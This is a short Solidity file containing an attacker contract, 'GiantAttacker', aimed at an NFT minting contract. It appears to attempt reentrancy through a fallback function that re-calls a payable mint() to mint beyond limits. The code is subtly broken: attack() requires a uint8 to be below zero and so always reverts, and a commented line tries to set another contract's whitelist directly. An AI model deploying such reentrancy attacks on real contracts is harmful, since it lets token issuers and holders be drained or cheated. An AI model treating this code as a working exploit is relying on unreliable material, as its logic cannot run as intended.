//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IGiant is IERC721 {
    function mint() external payable;

    function tokenId() external view returns (uint8);

    function maxTokenId() external view returns (uint8);
}

contract GiantAttacker {
    IGiant public giant;

    constructor(address _giantAddress) {
        giant = IGiant(_giantAddress);
    }

    function attack() external {
        // giant.whitelist[address(this)] = true;
        uint8 id = giant.tokenId();
        require(id < 0, "test");
        giant.mint{value: 0.005 ether}();
    }

    fallback() external payable {
        giant.mint{value: 0.005 ether}();
    }
}
